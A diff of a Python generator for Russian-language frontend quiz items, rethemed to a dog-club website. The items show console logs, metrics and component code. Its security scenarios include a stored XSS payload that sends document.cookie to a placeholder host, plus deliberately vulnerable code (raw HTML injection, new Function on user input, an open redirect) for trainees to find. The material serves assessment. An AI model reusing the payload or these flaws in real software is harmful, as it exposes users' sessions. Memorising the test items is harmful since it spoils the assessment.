@@ -1,4 +1,4 @@
-"""Frontend, «Неделя до релиза»: сценарные семейства с логами консоли, графиками метрик и кодом компонентов.
+"""Frontend, «Неделя до выставки» (сайт клуба джек-расселов): сценарные семейства с логами консоли, графиками метрик и кодом компонентов.
 По 3 семейства на компетенцию сверх простых шаблонов items.py; a, b — экспертная оценка до калибровки.
 У каждого семейства три варианта механики (items._variant), правильные ответы других вариантов — среди дистракторов."""
 
@@ -31,7 +31,7 @@ def _(rng):
                                "У части элементов автора нет (null): обработать отсутствующие данные — опциональная цепочка и заглушка"], v,
                          ["Vite не пересобрал модуль после изменения файла: нужен полный перезапуск dev-сервера с очисткой кэша",
                           "У элементов списка нет key, поэтому React не может отрисовать map"])
-    return {"scene_title": "Белый экран", "story": f"На предрелизном стенде экран {comp} падает при открытии. Состояние объявлено как {state}, данные грузятся в useEffect.",
+    return {"scene_title": "Белый экран", "story": f"На предрелизном стенде сайта клуба экран {comp} падает при открытии. Состояние объявлено как {state}, данные грузятся в useEffect.",
             "prompt": "Почему компонент падает?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}
 
 
@@ -44,9 +44,9 @@ def _(rng):
     mismatch = [f'Text content did not match. Server: "{day:02d}.10.2026, {h:02d}:{m:02d}" Client: "{day:02d}.10.2026, {h + off:02d}:{m:02d}"',
                 f'Prop `id` did not match. Server: "field-{rng.randint(1000, 9999)}" Client: "field-{rng.randint(1000, 9999)}"',
                 'Text content did not match. Server: "Войти" Client: "Привет, Анна"'][v]
-    story = [f"Пользователи из {city} жалуются: время доставки на секунду показывается одно, потом меняется.",
-             "После перехода на SSR поля формы теряют связь с подписями.",
-             "Залогиненные пользователи на мгновение видят «Войти» вместо своего имени — имя хранится в localStorage."][v]
+    story = [f"Хозяева из {city}, заказавшие атрибутику к выставке, жалуются: время доставки на секунду показывается одно, потом меняется.",
+             "После перехода сайта клуба на SSR поля формы теряют связь с подписями.",
+             "Залогиненные члены клуба на мгновение видят «Войти» вместо своего имени — имя хранится в localStorage."][v]
     lines = [_log("14:32:07", "browser", "WARN", f"Warning: {mismatch}\n    at {comp}"),
              _log("14:32:07", "browser", "ERROR", "Error: Hydration failed because the initial UI does not match what was rendered on the server."),
              _log("14:32:07", "browser", "WARN", "There was an error while hydrating. Switched to client rendering."),
@@ -108,17 +108,17 @@ def _(rng):
         lines = ["function safeHref(raw: string): string {", f'  if ({check}) return "#";', "  return raw;", "}", "",
                  f'<a href={{safeHref(profile.{field})}} target="_blank" rel="noopener">Сайт</a>',
                  f'// в базе: profile.{field} = "{payload}fetch(\'//{host}/?c=\'+document.cookie)"']
-        story = f"Клик по ссылке «Сайт» в анкете выполнил скрипт в сессии {role}. Санитайзер ссылок на ревью выглядел нормально."
+        story = f"Клик по ссылке «Сайт» в анкете заводчика выполнил скрипт в сессии {role}. Санитайзер ссылок на ревью выглядел нормально."
     elif v == 1:
         patch = "Проверять расширение файла: принимать только .png, .jpg и .svg"
         lines = ["// загрузка аватара", 'if (!["image/png", "image/jpeg", "image/svg+xml"].includes(file.type)) throw new Error("bad type");',
                  "await upload(`/media/avatars/${user.id}`, file);", "", "// отдача: тот же домен, что и приложение", "// GET /media/avatars/<id> → Content-Type из загрузки, без Content-Disposition"]
-        story = f"Аватар из анкеты, открытый {role_by} по прямой ссылке в новой вкладке, выполнил скрипт в его сессии. Загружаются только картинки."
+        story = f"Аватар из анкеты заводчика, открытый {role_by} по прямой ссылке в новой вкладке, выполнил скрипт в его сессии. Загружаются только картинки."
     else:
         patch = "Проверять event.data.type строже: принимать только тип setToken и токен нужного формата"
         lines = ['window.addEventListener("message", (event) => {', '  if (event.data?.type === "setToken") {', "    widget.setToken(event.data.token);", "  }", "});",
                  "", "// виджет оплаты открывается во всплывающем окне и сообщает токен обратно через postMessage"]
-        story = f"Сторонняя страница, открытая из нашего приложения, подменила токен платёжного виджета в сессии {role}."
+        story = f"Сторонняя страница, открытая с сайта клуба, подменила токен платёжного виджета в сессии {role}."
     opts, key = _options(rng, ["Чёрный список обходится нормализацией URL: пускать только http/https по new URL(raw).protocol",
                                "SVG — документ со скриптами: пользовательские файлы отдавать с отдельного домена и с Content-Disposition: attachment",
                                "Обработчик postMessage принимает сообщения от любого окна: проверять event.origin по белому списку"], v,
@@ -139,7 +139,7 @@ def _(rng):
     v = _variant(rng, 3)
     mark, name, mx, data, story = [
         ("новый баннер", "вес главной, МБ", 10, [round(rng.uniform(1.2, 1.6), 1) if i < rel else round(mb + rng.uniform(1.2, 1.6), 1) for i in range(8)],
-         f"Маркетинг заменил баннер на главной на PNG {w}×{hgt}. С этого дня LCP вырос почти втрое, остальной код не менялся."),
+         f"Клуб заменил баннер на главной на PNG {w}×{hgt} — Рей в прыжке за мячом. С этого дня LCP вырос почти втрое, остальной код не менялся."),
         ("виджет чата", "синхронный JS в <head>, КБ", 1000, [rng.randint(60, 90) if i < rel else rng.randint(700, 900) for i in range(8)],
          "В <head> главной подключили виджет онлайн-чата обычным тегом script. С этого дня LCP вырос почти втрое."),
         ("ленивые картинки", "старт загрузки баннера, мс от начала", 6000, [rng.randint(200, 400) if i < rel else rng.randint(3800, 5200) for i in range(8)],
@@ -221,12 +221,12 @@ def _(rng):
             ('Обработчик window.addEventListener("resize")', "getEventListeners(window).resize в консоли растёт на один при каждом переключении"),
             ("Подписка на общую шину событий", "bus.listenerCount(\"update\") растёт на один при каждом переключении"),
         ])
-        story = f"Операторы весь день переключают вкладки «{a}» ↔ «{b}». Через полчаса интерфейс вязнет; в снимке кучи — {rng.randint(8, 30) * 1000} Detached HTMLDivElement, {clue}."
+        story = f"Операторы приёма заявок весь день переключают вкладки «{a}» ↔ «{b}». Через полчаса интерфейс вязнет; в снимке кучи — {rng.randint(8, 30) * 1000} Detached HTMLDivElement, {clue}."
     else:
         sub = "Подписка на события"
-        story = [None, f"Операторы весь день открывают карточки во вкладке «{a}». Через полчаса интерфейс вязнет; detached-узлов нет, в снимке кучи растёт Map в модуле cardCache — "
+        story = [None, f"Операторы приёма заявок весь день открывают карточки во вкладке «{a}». Через полчаса интерфейс вязнет; detached-узлов нет, в снимке кучи растёт Map в модуле cardCache — "
                        f"по записи на каждую открытую карточку, {rng.randint(3, 9)} тыс. записей.",
-                 f"Операторы весь день загружают фото документов во вкладке «{a}» и смотрят превью. Через полчаса интерфейс вязнет; detached-узлов нет, "
+                 f"Операторы приёма заявок весь день загружают фото документов во вкладке «{a}» и смотрят превью. Через полчаса интерфейс вязнет; detached-узлов нет, "
                  f"в chrome://blob-internals — {rng.randint(400, 900)} blob-объектов по 3–8 МБ."][v]
     x = [f"{5 * i} мин" for i in range(8)]
     heap = [round(60 + i * rng.uniform(38, 46)) for i in range(8)]
@@ -255,13 +255,13 @@ def _(rng):
         lines.append(f"      <div dangerouslySetInnerHTML={{{{ __html: {ent}.text }}}} />")
         key = len(lines)
         lines += [f"      <Likes count={{{ent}.likes}} />", "    </article>", "  );", "}"]
-        story, caption = f"Стажёр сделал вывод {who} с сохранением форматирования. Текст пишут сами пользователи. Ревью за вами.", f"форматирование {who}"
+        story, caption = f"Волонтёр клуба сделал вывод {who} с сохранением форматирования. Текст пишут сами пользователи. Ревью за вами.", f"форматирование {who}"
     elif v == 1:
         lines = ["function ReportCell({ row, column }) {", "  // формулы колонок пользователи пишут сами: «price * qty»", "  const value = useMemo(() => {",
                  "    const fn = new Function(...Object.keys(row), `return ${column.formula};`);"]
         key = len(lines)
         lines += ["    return fn(...Object.values(row));", "  }, [row, column.formula]);", "  return <td>{value}</td>;", "}"]
-        story, caption = "Стажёр сделал пользовательские формулы в отчётах; отчёты с формулами можно расшаривать коллегам. Ревью за вами.", "формулы в отчётах"
+        story, caption = "Волонтёр клуба сделал пользовательские формулы в отчётах; отчёты с формулами можно расшаривать коллегам. Ревью за вами.", "формулы в отчётах"
     else:
         lines = ["function LoginSuccess() {", "  const params = new URLSearchParams(location.search);", "  useEffect(() => {"]
         if rng.random() < 0.5:
@@ -269,8 +269,8 @@ def _(rng):
         lines.append('    window.location.href = params.get("next") || "/";')
         key = len(lines)
         lines += ["  }, []);", "  return <Spinner />;", "}"]
-        story, caption = "Стажёр сделал возврат пользователя на нужную страницу после входа. Ревью за вами.", "редирект после входа"
-    return {"scene_title": "Ревью стажёра", "story": story, "prompt": "Нажмите на строку с уязвимостью.",
+        story, caption = "Волонтёр клуба сделал возврат пользователя на нужную страницу после входа. Ревью за вами.", "редирект после входа"
+    return {"scene_title": "PR волонтёра", "story": story, "prompt": "Нажмите на строку с уязвимостью.",
             "panel": {"type": "code", "lang": "tsx", "lines": lines, "caption": f"PR #{rng.randint(300, 899)} · «{caption}»"}, "key": key}
 
 
@@ -285,7 +285,7 @@ def _(rng):
         lines += ["", "  useEffect(() => {", "    const id = setInterval(() => {", "      setSeconds(seconds - 1);"]
         key = [len(lines), len(lines) + 3]
         lines += ["    }, 1000);", "    return () => clearInterval(id);", "  }, []);", "", "  return <span>{seconds}</span>;", "}"]
-        story = f"Таймер «{label}» показывает {start}, затем {start - 1} и замирает, хотя интервал продолжает срабатывать каждую секунду."
+        story = f"Вы заполняете заявку Рея на выставку, а таймер «{label}» показывает {start}, затем {start - 1} и замирает, хотя интервал продолжает срабатывать каждую секунду."
     elif v == 1:
         modal = rng.choice(["Modal", "Drawer", "Lightbox"])
         lines = [f"function {modal}({{ onClose, children }}) {{", "  useEffect(() => {", '    const onKey = (e) => e.key === "Escape" && onClose();',
@@ -324,7 +324,7 @@ def _(rng):
     if v == 2:
         key = len(lines)
     lines += ["  original.headers.Authorization = `Bearer ${tokens.access}`;", f"  return {cl}(original);", "});"]
-    story = [f"Refresh-токен одноразовый: сервер выдаёт новый и отзывает старый. Когда access-токен истекает, дашборд с {n} параллельными запросами выкидывает пользователя на логин.",
+    story = [f"Refresh-токен одноразовый: сервер выдаёт новый и отзывает старый. Когда access-токен истекает, дашборд организаторов выставки с {n} параллельными запросами выкидывает пользователя на логин.",
              "Когда истекает и refresh-токен, вкладка зависает: в Network — тысячи запросов /auth/refresh подряд, каждый с ответом 401.",
              "Refresh-токен одноразовый: сервер выдаёт новый и отзывает старый. Первое истечение access-токена проходит незаметно, а при втором пользователя выкидывает на логин."][v]
     prompt = "Нажмите на строку, из-за которой вкладка уходит в бесконечные запросы." if v == 1 else "Нажмите на строку, из-за которой пользователя разлогинивает."
@@ -404,18 +404,18 @@ def _(rng):
         for w in rng.sample(widgets, 2):
             t += rng.randint(5, 40)
             lines.append(_log(f"Вт 11:{s:02d}:00.{t:03d}", "network", "INFO", f"GET /api/cart 200 ({rng.randint(150, 400)} ms) initiator: {w}.tsx"))
-        story = "Главная грузится медленно. В DevTools одни и те же запросы уходят по несколько раз: каждый виджет сам загружает данные в useEffect."
+        story = "Главная сайта клуба грузится медленно. В DevTools одни и те же запросы уходят по несколько раз: каждый виджет сам загружает данные в useEffect."
     elif v == 1:
         for api in ["/api/me", "/api/cart", "/api/recommendations", "/api/banners"]:
             ms = rng.randint(250, 400)
             lines.append(_log(f"Вт 11:{s:02d}:{t // 1000:02d}.{t % 1000:03d}", "network", "INFO", f"GET {api} 200 ({ms} ms) — начат после завершения предыдущего"))
             t += ms + rng.randint(5, 20)
-        story = "Главная грузится медленно. Каждый из четырёх запросов уходит только после ответа предыдущего, хотя они друг от друга не зависят."
+        story = "Главная сайта клуба грузится медленно. Каждый из четырёх запросов уходит только после ответа предыдущего, хотя они друг от друга не зависят."
     else:
         mb = rng.randint(4, 9)
         lines = [_log(f"Вт 11:{s:02d}:00.120", "network", "INFO", f"GET /api/orders 200 ({mb}.{rng.randint(1, 9)} MB, {rng.randint(1800, 3200)} ms)"),
                  _log(f"Вт 11:{s:02d}:03.400", "console", "INFO", f"orders: {rng.randint(15, 40)} 000 записей × 60 полей; таблица показывает 20 строк и 5 колонок")]
-        story = "Страница заказов грузится несколько секунд даже на хорошем интернете."
+        story = "Страница заказов магазина клуба грузится несколько секунд даже на хорошем интернете."
     lines.append(_log(f"Вт 11:{s:02d}:04.{rng.randint(100, 900):03d}", "lighthouse", "WARN", f"Time to Interactive {rng.randint(4, 7)}.{rng.randint(0, 9)} s"))
     opts, key = _options(rng, ["Общий слой серверного состояния с кэшем и дедупликацией (TanStack Query, SWR или свой загрузчик)",
                                "Запускать независимые запросы параллельно (Promise.all или загрузка на уровне маршрута)",
@@ -437,7 +437,7 @@ def _(rng):
                                                         "  3. You might have more than one copy of React in the same app"),
                  _log("Ср 15:02:12", "browser", "ERROR", f"TypeError: Cannot read properties of null (reading 'useState')\n    at {widget} ({mf}/src/{widget}.tsx:{rng.randint(8, 30)})"),
                  _log("Ср 15:02:12", "build", "INFO", f"host: react@{host_v}, ModuleFederationPlugin shared: {{}}")]
-        story = f"Микрофронтенд {mf} соседней команды подключили к хосту через Module Federation. По отдельности оба работают, вместе {widget} падает."
+        story = f"Микрофронтенд {mf} от партнёров клуба подключили к хосту через Module Federation. По отдельности оба работают, вместе {widget} падает."
     elif v == 1:
         lines = [_log("Ср 15:02:11", "host", "INFO", f"loaded remote {mf}@https://static.example.local/{mf}/remoteEntry.js"),
                  _log("Ср 15:02:12", "devtools", "INFO", f".btn {{ background: #ff5a00 }} — {mf}/styles.css (global) перекрывает host/ui-kit.css"),
@@ -466,18 +466,18 @@ def _(rng):
                  _log("10:41:02", "cdn-edge", "INFO", f"response: cache-control: public, s-maxage={ttl}; vary: Accept-Encoding"),
                  _log("10:41:03", "web-ssr", "INFO", f"render {page} user=u_{rng.randint(1000, 9999)} stream=on 182 ms"),
                  _log("10:41:09", "support", "WARN", f"жалоба #{rng.randint(300, 900)}: в шапке {who}")]
-        story = f"Чтобы выдержать распродажу, {page} начали кэшировать на CDN на {ttl} с. Нагрузка на сервер упала, но за {n} пришли жалобы: в шапке — {who}."
+        story = f"Чтобы выдержать распродажу атрибутики перед выставкой, {page} начали кэшировать на CDN на {ttl} с. Нагрузка на сервер упала, но за {n} пришли жалобы: в шапке — {who}."
     elif v == 1:
         page = "/promo" if page == "/orders" else page
         lines = [_log("10:41:02", "cdn-edge", "INFO", f"GET {page} 200 x-cache: MISS"), _log("10:41:02", "cdn-edge", "INFO", f"response: cache-control: public, s-maxage={ttl}; vary: Cookie"),
                  _log("10:41:30", "cdn-edge", "INFO", f"hit ratio {page}: 0.{rng.randint(1, 9)} %, origin RPS без изменений")]
-        story = (f"Чтобы выдержать распродажу, {page} начали кэшировать на CDN на {ttl} с. Персональных данных на странице нет, она одинакова для всех. "
+        story = (f"Чтобы выдержать распродажу атрибутики перед выставкой, {page} начали кэшировать на CDN на {ttl} с. Персональных данных на странице нет, она одинакова для всех. "
                  "Нагрузка на сервер не изменилась.")
     else:
         lines = [_log("10:41:02", "cdn-edge", "INFO", f"GET {page}?page=3&sort=price 200 x-cache: HIT age={rng.randint(5, ttl - 1)}"),
                  _log("10:41:02", "cdn-edge", "INFO", "cache key: host + path (query string ignored)"),
                  _log("10:41:09", "support", "WARN", "жалоба: на любой странице каталога и при любой сортировке — одни и те же товары")]
-        story = f"Чтобы выдержать распродажу, {page} начали кэшировать на CDN на {ttl} с. Нагрузка упала, но пагинация и сортировка перестали работать."
+        story = f"Чтобы выдержать распродажу атрибутики перед выставкой, {page} начали кэшировать на CDN на {ttl} с. Нагрузка упала, но пагинация и сортировка перестали работать."
     opts, key = _options(rng, ["Персональная шапка попала в общий кэш: каркас — в CDN, персональный блок — отдельным запросом с Cache-Control: private",
                                "Vary: Cookie делает копию на каждого посетителя, и кэш не попадает: убрать Vary: Cookie из ответа",
                                "Ключ кэша не учитывает строку запроса: включить в него page и sort"], v,
@@ -498,18 +498,18 @@ def _(rng):
     if v == 0:
         lines.append(f'  <input type="{typ}" placeholder="{ph}">')
         key = len(lines)
-        story = f"Тестировщик проверяет форму {form} со скринридером. На одном из полей тот читает только «поле ввода», и непонятно, что вводить."
+        story = f"Волонтёр-тестировщик проверяет форму {form} со скринридером. На одном из полей тот читает только «поле ввода», и непонятно, что вводить."
     else:
         lines += [f'  <label for="f2">{ph}</label>', f'  <input id="f2" type="{typ}">']
         if v == 1:
             num, spoken = rng.choice([(12, "двенадцать"), (24, "двадцать четыре"), (42, "сорок два"), (64, "шестьдесят четыре")])
             lines.append(f'  <a href="/help"><img src="/img/help-{num}.svg"></a>')
             key = len(lines)
-            story = f"Тестировщик проверяет форму {form} со скринридером. На одной ссылке тот читает «ссылка, help тире {spoken} точка svg»."
+            story = f"Волонтёр-тестировщик проверяет форму {form} со скринридером. На одной ссылке тот читает «ссылка, help тире {spoken} точка svg»."
         else:
             lines.append('  <div class="btn" onclick="submitForm()">Продолжить</div>')
             key = len(lines)
-            story = f"Тестировщик проверяет форму {form} с клавиатуры: до кнопки «Продолжить» не добраться Tab, Enter её не нажимает."
+            story = f"Волонтёр-тестировщик проверяет форму {form} с клавиатуры: до кнопки «Продолжить» не добраться Tab, Enter её не нажимает."
     if v != 2:
         lines.append('  <button type="submit">Продолжить</button>')
     lines.append("</form>")
